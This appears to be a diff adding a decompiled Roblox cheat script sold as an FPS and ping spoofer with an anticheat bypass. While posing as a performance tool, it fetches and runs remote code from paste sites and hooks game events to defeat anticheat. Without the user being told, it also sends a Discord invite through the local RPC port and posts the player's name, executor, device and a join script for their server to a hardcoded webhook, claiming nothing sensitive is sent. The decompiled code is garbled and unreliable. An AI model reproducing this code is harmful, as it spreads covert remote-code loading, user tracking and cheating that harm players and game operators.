@@ -1,0 +1,1251 @@
+-- ts file was generated at discord.gg/25ms
+
+
+local fenv = getfenv()
+local _call3 = game:GetService("HttpService")
+local _call5 = game:GetService("CoreGui")
+
+local _call8 = Instance.new("Sound")
+_call8.SoundId = "rbxassetid://72171849228899"
+_call8.Volume = - 0
+_call8.Parent = _call5
+_call8:Play()
+_call8:Stop()
+_call8:Destroy()
+CHECKIF(request)
+CHECKIF(request)
+local _call18 = _call3:JSONEncode({
+    cmd = "INVITE_BROWSER",
+    args = {
+        code = "pHCgmbTuTu",
+    },
+    nonce = _call3:GenerateGUID(false),
+})
+request({
+    Body = _call18,
+    Url = "http://127.0.0.1:6463/rpc?v=1",
+    Method = "POST",
+    Headers = {
+        Origin = "https://discord.com",
+        ["Content-Type"] = "application/json",
+    },
+})
+identifyexecutor()
+
+CHECKIF(getconnections)
+CHECKIF(getgc)
+CHECKIF(hookfunction)
+CHECKIF(getrawmetatable)
+CHECKIF(setthreadidentity)
+CHECKIF(setreadonly)
+CHECKIF(getnamecallmethod)
+loadstring(game:HttpGet("https://pastefy.app/h4MsHdxx/raw"))()
+task.delay(- 2, function(...)
+    local _call36 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebula-Softworks/Luna-Interface-Suite/master/source.lua"))():CreateWindow({
+        LoadingTitle = "Performance Hub",
+        Subtitle = "v1.0.1 - Bypassed New AntiCheat",
+        LogoID = "6031097225",
+        DefaultSize = UDim2.new(- 0, - 600, - 0, - 400),
+        LoadingEnabled = false,
+        LoadingSubtitle = "by Nebula Softworks",
+        Name = "Flex Your Fps And Ping",
+    })
+    loadstring(game:HttpGet("https://pastefy.app/iI4YlgQ1/raw"))()
+    local _call42 = game:GetService("Players")
+    for _45, _45_2 in ipairs(_call42:GetPlayers()) do
+        CHECKIF(_45)
+        local _Name46 = _45_2.Name
+        local _ = "xxisaacturboarrowxx" ~= _Name46:lower()
+        local _ = "luv_papidob" ~= _Name46:lower()
+        local _ = "sply_evan" ~= _Name46:lower()
+        local _ = "che4m5" ~= _Name46:lower()
+        local _ = "ranc1ent" ~= _Name46:lower()
+        local _ = "spoodles1278" ~= _Name46:lower()
+        local _ = "savagepeeps146" ~= _Name46:lower()
+        local _ = "twixchocolatem" ~= _Name46:lower()
+        local _ = "mrpiebroathes" ~= _Name46:lower()
+        local _ = "validtake" ~= _Name46:lower()
+        local _ = "rtyqz" ~= _Name46:lower()
+    end
+    _call42.PlayerAdded:Connect(function(...)
+        local _83_vararg1 = ...
+        local _Name84 = _83_vararg1.Name
+        local _ = "xxisaacturboarrowxx" ~= _Name84:lower()
+        local _ = "luv_papidob" ~= _Name84:lower()
+        local _ = "sply_evan" ~= _Name84:lower()
+        local _ = "che4m5" ~= _Name84:lower()
+        local _ = "ranc1ent" ~= _Name84:lower()
+        local _ = "spoodles1278" ~= _Name84:lower()
+        local _ = "savagepeeps146" ~= _Name84:lower()
+        local _ = "twixchocolatem" ~= _Name84:lower()
+        local _ = "mrpiebroathes" ~= _Name84:lower()
+        local _ = "validtake" ~= _Name84:lower()
+        local _ = "rtyqz" ~= _Name84:lower()
+    end)
+    local _call119 = _call36:CreateTab({
+        ShowTitle = true,
+        ImageSource = "Material",
+        Icon = "speed",
+        Name = "Performance",
+    })
+    local _call121 = _call119:CreateSection("FPS Control")
+    local _call123 = _call36:CreateTab({
+        ShowTitle = true,
+        ImageSource = "Material",
+        Icon = "settings",
+        Name = "Settings",
+    })
+    local _call125 = _call123:CreateSection("General")
+    CHECKIF(_call125)
+    local _ = _call125.CreateToggle
+    CHECKIF(_call121)
+    local _ = _call121.CreateToggle
+    CHECKIF(_call121)
+    local _ = _call121.CreateToggle
+    local _ = fenv.minInput
+    local _ = fenv.maxInput
+    _call119:CreateSection("Display Settings"):CreateInput({
+        CurrentValue = "-1920x-1080",
+        PlaceholderText = "1920x1080",
+        Name = "Screen Resolution (e.g. 1920x1080)",
+        Callback = function(...)
+            local _135_vararg1 = ...
+            CHECKIF(_135_vararg1:match("^(%d+)x(%d+)$"))
+        end,
+    })
+    local _call139 = _call119:CreateSection("Ping Spoofing")
+    _call139:CreateToggle({
+        CurrentValue = false,
+        Callback = function(...)
+            local _142_vararg1 = ...
+            _call139:CreateInput({
+                CurrentValue = "-0",
+                PlaceholderText = "e.g. 100",
+                Name = "Set Ping (ms) YOU CANNOT GO LOWER THAN YOUR REAL PING",
+                Callback = function(...)
+                end,
+            })
+            CHECKIF(_142_vararg1)
+            for _152, _152_2 in ipairs(getconnections(game.ReplicatedStorage.DTr.womp.OnClientEvent)) do
+                CHECKIF(_152)
+                _152_2:Disable()
+            end
+            game.ReplicatedStorage.DTr.womp.OnClientEvent:Connect(function(...)
+                local _161_vararg1 = ...
+                task.wait(0)
+                game.ReplicatedStorage.DTr.yourself:FireServer(_161_vararg1)
+            end)
+        end,
+        Description = "Spoof your ping.",
+        Name = "Set Ping (ms)",
+    })
+    local _call170 = _call36:CreateTab({
+        ShowTitle = true,
+        ImageSource = "Material",
+        Icon = "update",
+        Name = "Updates",
+    })
+    _call170:CreateSection("v1.0.1 - Bypassed New AntiCheat"):CreateLabel({
+        Style = - 2,
+        Text = "- Bypassed New Anticheat",
+    })
+    fenv.enableFpsSpoof = function(...)
+        game:GetService("ReplicatedStorage"):WaitForChild("DTr"):WaitForChild("kill")
+        hookmetamethod(game, "__index", function(...)
+            error("line 1: attempt to call a nil value")
+        end)
+    end
+    fenv.disableFpsSpoof = function(...)
+        hookmetamethod(game, "__index", _callhookmetamethod182)
+    end
+    local _workspaceCurrentCamera187 = workspace.CurrentCamera
+    local _callgetrawmetatable189 = getrawmetatable(_workspaceCurrentCamera187)
+    setreadonly(_callgetrawmetatable189, false)
+    local __index191 = _callgetrawmetatable189.__index
+    newcclosure(function(...)
+        local _192_vararg1, _192_vararg2 = ...
+        local _ = _192_vararg1 == _workspaceCurrentCamera187
+        local _ = _192_vararg1 == _workspaceCurrentCamera187
+        return __index191(_192_vararg1, _192_vararg2)
+    end)
+    _callgetrawmetatable189.__index = function(...)
+        local _200_vararg1, _200_vararg2 = ...
+        local _ = _200_vararg1 == _workspaceCurrentCamera187
+        local _ = _200_vararg1 == _workspaceCurrentCamera187
+        return __index191(_200_vararg1, _200_vararg2)
+    end
+    setreadonly(_callgetrawmetatable189, true)
+end)
+local _call208 = game:GetService("HttpService")
+local _LocalPlayer209 = game:GetService("Players").LocalPlayer
+
+local _Name211 = _LocalPlayer209.Name
+CHECKIF(_Name211)
+local _212, _212_2 = identifyexecutor()
+
+CHECKIF(_212_2)
+local _214, _214_2, _214_3 = string.format("%s v%s", _212, _212_2)
+local _workspaceCurrentCamera215 = workspace.CurrentCamera
+
+local _ViewportSize217 = _workspaceCurrentCamera215.ViewportSize
+local _221, _221_2, _221_3 = string.format("Unknown OS | Screen: %sx%s", _ViewportSize217.X, _ViewportSize217.Y)
+local _gamePlaceId222 = game.PlaceId
+local _call224 = game:GetService("MarketplaceService")
+local _ = game.JobId ~= ""
+local _gameJobId230 = game.JobId
+local _232, _232_2, _232_3 = string.format("No sensitive information is being sent through our webhook, it is only for joining people using our script for feedback and fun. We ask that you please don't spam our webhook.\n\n**[User Online]**\nUsername: `%s`\nExecutor: `%s`\nDevice: `%s`\nPlace ID: `%s`\nGame Title: `%s`\n\n**Join Code**\nCopy the code and paste into roblox page (roblox.com) console\n(F12 -> Console)\n```lua\nRoblox.GameLauncher.joinGameInstance(%s, \"%s\")\n```\n\n**Join Script (Executor)**\n```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\", game.Players.LocalPlayer)\n```", _Name211, _214, _221, _gamePlaceId222, _call224:GetProductInfo(_gamePlaceId222).Name, _gamePlaceId222, _gameJobId230, _gamePlaceId222, _gameJobId230)
+
+local _call235 = _call208:JSONEncode({
+    content = _232,
+})
+local _callrequest236 = request({
+    Body = _call235,
+    Url = "https://discord.com/api/webhooks/1422862908429439016/jSgmc1xsfwXXupvyxN2LG2WcOJQW7j3X9dGKTJkA4lfR9eBJZ-dB_xlU_m0NCGf-vlfg",
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json",
+    },
+})
+CHECKIF(_callrequest236)
+local _ = not _callrequest236.Success
+local _call240 = game:GetService("Players")
+local _LocalPlayer241 = _call240.LocalPlayer
+local _call243 = game:GetService("ReplicatedStorage")
+local _callrequest244 = request({
+    Url = "https://pastefy.app/nmcuhZc1/raw",
+    Method = "GET",
+    Timeout = - 10,
+})
+local _ = not _callrequest244.Body
+task.spawn(function(...)
+    task.wait(- 60)
+    local _callrequest251 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest251.Body
+    task.wait(- 60)
+    local _callrequest255 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest255.Body
+    task.wait(- 60)
+    local _callrequest259 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest259.Body
+    task.wait(- 60)
+    local _callrequest263 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest263.Body
+    task.wait(- 60)
+    local _callrequest267 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest267.Body
+    task.wait(- 60)
+    local _callrequest271 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest271.Body
+    task.wait(- 60)
+    local _callrequest275 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest275.Body
+    task.wait(- 60)
+    local _callrequest279 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest279.Body
+    task.wait(- 60)
+    local _callrequest283 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest283.Body
+    task.wait(- 60)
+    local _callrequest287 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest287.Body
+    task.wait(- 60)
+    local _callrequest291 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest291.Body
+    task.wait(- 60)
+    local _callrequest295 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest295.Body
+    task.wait(- 60)
+    local _callrequest299 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest299.Body
+    task.wait(- 60)
+    local _callrequest303 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest303.Body
+    task.wait(- 60)
+    local _callrequest307 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest307.Body
+    task.wait(- 60)
+    local _callrequest311 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest311.Body
+    task.wait(- 60)
+    local _callrequest315 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest315.Body
+    task.wait(- 60)
+    local _callrequest319 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest319.Body
+    task.wait(- 60)
+    local _callrequest323 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest323.Body
+    task.wait(- 60)
+    local _callrequest327 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest327.Body
+    task.wait(- 60)
+    local _callrequest331 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest331.Body
+    task.wait(- 60)
+    local _callrequest335 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest335.Body
+    task.wait(- 60)
+    local _callrequest339 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest339.Body
+    task.wait(- 60)
+    local _callrequest343 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest343.Body
+    task.wait(- 60)
+    local _callrequest347 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest347.Body
+    task.wait(- 60)
+    local _callrequest351 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest351.Body
+    task.wait(- 60)
+    local _callrequest355 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest355.Body
+    task.wait(- 60)
+    local _callrequest359 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest359.Body
+    task.wait(- 60)
+    local _callrequest363 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest363.Body
+    task.wait(- 60)
+    local _callrequest367 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest367.Body
+    task.wait(- 60)
+    local _callrequest371 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest371.Body
+    task.wait(- 60)
+    local _callrequest375 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest375.Body
+    task.wait(- 60)
+    local _callrequest379 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest379.Body
+    task.wait(- 60)
+    local _callrequest383 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest383.Body
+    task.wait(- 60)
+    local _callrequest387 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest387.Body
+    task.wait(- 60)
+    local _callrequest391 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest391.Body
+    task.wait(- 60)
+    local _callrequest395 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest395.Body
+    task.wait(- 60)
+    local _callrequest399 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest399.Body
+    task.wait(- 60)
+    local _callrequest403 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest403.Body
+    task.wait(- 60)
+    local _callrequest407 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest407.Body
+    task.wait(- 60)
+    local _callrequest411 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest411.Body
+    task.wait(- 60)
+    local _callrequest415 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest415.Body
+    task.wait(- 60)
+    local _callrequest419 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest419.Body
+    task.wait(- 60)
+    local _callrequest423 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest423.Body
+    task.wait(- 60)
+    local _callrequest427 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest427.Body
+    task.wait(- 60)
+    local _callrequest431 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest431.Body
+    task.wait(- 60)
+    local _callrequest435 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest435.Body
+    task.wait(- 60)
+    local _callrequest439 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest439.Body
+    task.wait(- 60)
+    local _callrequest443 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest443.Body
+    task.wait(- 60)
+    local _callrequest447 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest447.Body
+    task.wait(- 60)
+    local _callrequest451 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest451.Body
+    task.wait(- 60)
+    local _callrequest455 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest455.Body
+    task.wait(- 60)
+    local _callrequest459 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest459.Body
+    task.wait(- 60)
+    local _callrequest463 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest463.Body
+    task.wait(- 60)
+    local _callrequest467 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest467.Body
+    task.wait(- 60)
+    local _callrequest471 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest471.Body
+    task.wait(- 60)
+    local _callrequest475 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest475.Body
+    task.wait(- 60)
+    local _callrequest479 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest479.Body
+    task.wait(- 60)
+    local _callrequest483 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest483.Body
+    task.wait(- 60)
+    local _callrequest487 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest487.Body
+    task.wait(- 60)
+    local _callrequest491 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest491.Body
+    task.wait(- 60)
+    local _callrequest495 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest495.Body
+    task.wait(- 60)
+    local _callrequest499 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest499.Body
+    task.wait(- 60)
+    local _callrequest503 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest503.Body
+    task.wait(- 60)
+    local _callrequest507 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest507.Body
+    task.wait(- 60)
+    local _callrequest511 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest511.Body
+    task.wait(- 60)
+    local _callrequest515 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest515.Body
+    task.wait(- 60)
+    local _callrequest519 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest519.Body
+    task.wait(- 60)
+    local _callrequest523 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest523.Body
+    task.wait(- 60)
+    local _callrequest527 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest527.Body
+    task.wait(- 60)
+    local _callrequest531 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest531.Body
+    task.wait(- 60)
+    local _callrequest535 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest535.Body
+    task.wait(- 60)
+    local _callrequest539 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest539.Body
+    task.wait(- 60)
+    local _callrequest543 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest543.Body
+    task.wait(- 60)
+    local _callrequest547 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest547.Body
+    task.wait(- 60)
+    local _callrequest551 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest551.Body
+    task.wait(- 60)
+    local _callrequest555 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest555.Body
+    task.wait(- 60)
+    local _callrequest559 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest559.Body
+    task.wait(- 60)
+    local _callrequest563 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest563.Body
+    task.wait(- 60)
+    local _callrequest567 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest567.Body
+    task.wait(- 60)
+    local _callrequest571 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest571.Body
+    task.wait(- 60)
+    local _callrequest575 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest575.Body
+    task.wait(- 60)
+    local _callrequest579 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest579.Body
+    task.wait(- 60)
+    local _callrequest583 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest583.Body
+    task.wait(- 60)
+    local _callrequest587 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest587.Body
+    task.wait(- 60)
+    local _callrequest591 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest591.Body
+    task.wait(- 60)
+    local _callrequest595 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest595.Body
+    task.wait(- 60)
+    local _callrequest599 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest599.Body
+    task.wait(- 60)
+    local _callrequest603 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest603.Body
+    task.wait(- 60)
+    local _callrequest607 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest607.Body
+    task.wait(- 60)
+    local _callrequest611 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest611.Body
+    task.wait(- 60)
+    local _callrequest615 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest615.Body
+    task.wait(- 60)
+    local _callrequest619 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest619.Body
+    task.wait(- 60)
+    local _callrequest623 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest623.Body
+    task.wait(- 60)
+    local _callrequest627 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest627.Body
+    task.wait(- 60)
+    local _callrequest631 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest631.Body
+    task.wait(- 60)
+    local _callrequest635 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest635.Body
+    task.wait(- 60)
+    local _callrequest639 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest639.Body
+    task.wait(- 60)
+    local _callrequest643 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest643.Body
+    task.wait(- 60)
+    local _callrequest647 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest647.Body
+    task.wait(- 60)
+    local _callrequest651 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest651.Body
+    task.wait(- 60)
+    local _callrequest655 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest655.Body
+    task.wait(- 60)
+    local _callrequest659 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest659.Body
+    task.wait(- 60)
+    local _callrequest663 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest663.Body
+    task.wait(- 60)
+    local _callrequest667 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest667.Body
+    task.wait(- 60)
+    local _callrequest671 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest671.Body
+    task.wait(- 60)
+    local _callrequest675 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest675.Body
+    task.wait(- 60)
+    local _callrequest679 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest679.Body
+    task.wait(- 60)
+    local _callrequest683 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest683.Body
+    task.wait(- 60)
+    local _callrequest687 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest687.Body
+    task.wait(- 60)
